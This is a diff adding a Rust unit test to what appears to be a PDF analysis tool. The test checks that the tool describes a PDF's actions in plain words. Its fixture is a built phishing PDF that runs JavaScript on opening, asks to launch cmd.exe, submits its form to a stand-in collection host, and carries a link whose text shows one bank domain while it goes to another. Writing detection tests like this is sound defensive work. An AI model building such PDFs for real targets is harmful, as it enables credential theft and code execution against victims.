@@ -973,3 +973,54 @@ fn a_black_box_over_a_scan_is_found_and_cleaned() {
         );
     }
 }
+
+/// What a PDF does besides being read, in words: its script on opening, a
+/// program it asks for, where its form goes, and a link whose words say one
+/// site while it goes to another.
+#[test]
+fn what_a_pdf_does_when_opened_is_said() {
+    let content =
+        b"BT /F1 12 Tf 72 700 Td (www.example-bank.com) Tj ET BT /F1 12 Tf 72 600 Td (Help) Tj ET";
+    let data = pdf_of(&[
+        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>".to_vec(),
+        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
+        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Annots [6 0 R 7 0 R] >>".to_vec(),
+        stream("", content),
+        b"<< /S /JavaScript /JS (this.submitForm\\(\\); app.alert\\('Update your details'\\);) >>".to_vec(),
+        b"<< /Type /Annot /Subtype /Link /Rect [70 690 320 720] /A << /S /URI /URI (https://login.example.info/verify) >> >>".to_vec(),
+        b"<< /Type /Annot /Subtype /Link /Rect [70 590 200 620] /A << /S /URI /URI (https://example-bank.com/help) >> >>".to_vec(),
+        b"<< /S /Launch /F (cmd.exe) >>".to_vec(),
+        b"<< /S /SubmitForm /F (https://collect.example.net/form) >>".to_vec(),
+    ]);
+    let doc = parse_pdf(&data);
+    let f = facts(&doc);
+    let get = |k: &str| {
+        f.iter()
+            .find(|(kind, _)| *kind == k)
+            .map(|(_, t)| t.to_string())
+    };
+    assert_eq!(get("opens").as_deref(), Some("it runs a script"));
+    assert!(
+        get("scripts")
+            .unwrap()
+            .contains("“this.submitForm(); app.alert('Update your details');”")
+    );
+    assert_eq!(get("launch").as_deref(), Some("asks to open “cmd.exe”"));
+    assert_eq!(
+        get("submits").as_deref(),
+        Some("sends its form's answers to collect.example.net")
+    );
+    assert_eq!(
+        get("weblinks").as_deref(),
+        Some("2 links, to login.example.info, example-bank.com")
+    );
+    assert_eq!(
+        get("linkmismatch").as_deref(),
+        Some("page 1: a link reads “www.example-bank.com” and goes to login.example.info")
+    );
+    assert!(
+        problems(&doc.tree)
+            .iter()
+            .any(|p| p == "a link goes somewhere other than it says")
+    );
+}
